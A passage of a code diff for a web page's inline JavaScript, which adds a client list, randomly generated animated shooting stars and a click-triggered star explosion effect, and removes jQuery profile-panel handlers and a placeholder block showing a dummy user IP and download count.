+    listItem.appendChild(clientImage);
+    listItem.appendChild(clientDetails);
+
+    clientList.appendChild(listItem);
+  });
 }
 
+// Display clients on page load
+document.addEventListener('DOMContentLoaded', displayClients);
 
-$(document).ready(function() {
-  // Profile Button Click Event
-  $('#profileButton').click(function() {
-    $('#profilePage').toggleClass('active');
-    $('#container').toggleClass('background-fade');
-  });
+// Generate Shooting Stars
+const starContainer = document.getElementById('stars');
 
-  // Close Button Click Event
-  $('.close').click(function() {
-    $('#profilePage').removeClass('active');
-    $('#container').removeClass('background-fade');
-  });
+function generateRandomStar() {
+  const star = document.createElement('div');
+  star.classList.add('star');
+
+  // Random size
+  const size = Math.random() * 6;
+  star.style.width = `${size}px`;
+  star.style.height = `${size}px`;
+
+  // Random position
+  const posX = Math.random() * 100;
+  const posY = Math.random() * 100;
+  star.style.left = `${posX}%`;
+  star.style.top = `${posY}%`;
+
+  // Random color
+  const colors = ['#d17a28','#a15005','#d66331','#8a4f08','#c76734','#7a2c01'];;
+  const color = colors[Math.floor(Math.random() * colors.length)];
+  star.style.backgroundColor = color;
+
+  // Random velocity
+  const velocity = Math.random() * 10 + 5;
+  star.style.setProperty('--trans-x', `${posX - 50}%`);
+  star.style.setProperty('--trans-y', `${posY + 110 + velocity}vh`);
+  star.style.animationDuration = `${Math.random() * 5 + 2}s`;
+
+  starContainer.appendChild(star);
+}
+
+for (let i = 0; i < 150; i++) {
+  generateRandomStar();
+}
+
+// Function to create explosion effect
+function createExplosion() {
+  const explosionContainer = document.getElementById('explosion');
+
+  // Clear previous explosion
+  explosionContainer.innerHTML = '';
+
+  // Generate random number of stars for explosion
+  const numStars = Math.floor(Math.random() * 30 + 20);
+
+  for (let i = 0; i < numStars; i++) {
+    const star = document.createElement('div');
+    star.classList.add('star', 'explosion-star');
+
+    // Random size
+    const size = Math.random() * 6;
+    star.style.width = `${size}px`;
+    star.style.height = `${size}px`;
+
+    // Random position within explosion container
+    const posX = Math.random() * 100;
+    const posY = Math.random() * 100;
+    star.style.left = `${posX}%`;
+    star.style.top = `${posY}%`;
+
+    // Random color
+    const colors = ['#d17a28', '#a15005', '#d66331', '#8a4f08', '#c76734', '#7a2c01'];
+    const color = colors[Math.floor(Math.random() * colors.length)];
+    star.style.backgroundColor = color;
+
+    // Random velocity
+    const velocity = Math.random() * 10 + 5;
+    star.style.setProperty('--trans-x', `${posX - 50}%`);
+    star.style.setProperty('--trans-y', `${posY + 110 + velocity}vh`);
+    star.style.animationDuration = `${Math.random() * 2 + 0.5}s`;
+
+    explosionContainer.appendChild(star);
+  }
+
+  // Show explosion for a short duration
+  setTimeout(() => {
+    explosionContainer.innerHTML = '';
+  }, 2000);
+}
+
+// Add explosion effect on click
+document.addEventListener('click', createExplosion);
 });
 
 
-// Update profile values
-document.addEventListener("DOMContentLoaded", function() {
-  // Get user IP (replace with your logic to retrieve the user IP)
-  var userIP = "123.456.789.0"; // Replace with the actual user IP value
-  var userIPElement = document.getElementById("userIP");
-  userIPElement.textContent = "User IP: " + userIP;
-
-  // Get download count (replace with your logic to fetch the download count)
-  var downloadCount = 100; // Replace with the actual download count value
-  var downloadCountElement = document.getElementById("downloadCount");
-  downloadCountElement.textContent = "Download Count: " + downloadCount;
-
-  // Check server status
-  checkServerStatus()
-    .then((status) => {
-      var serverStatus = status ? "Online" : "Offline";
-      var serverStatusElement = document.getElementById("serverStatus");
-      serverStatusElement.textContent = "Server Status: " + serverStatus;
-    });
-});
-  </script>
+</script>
 </body>
 </html>
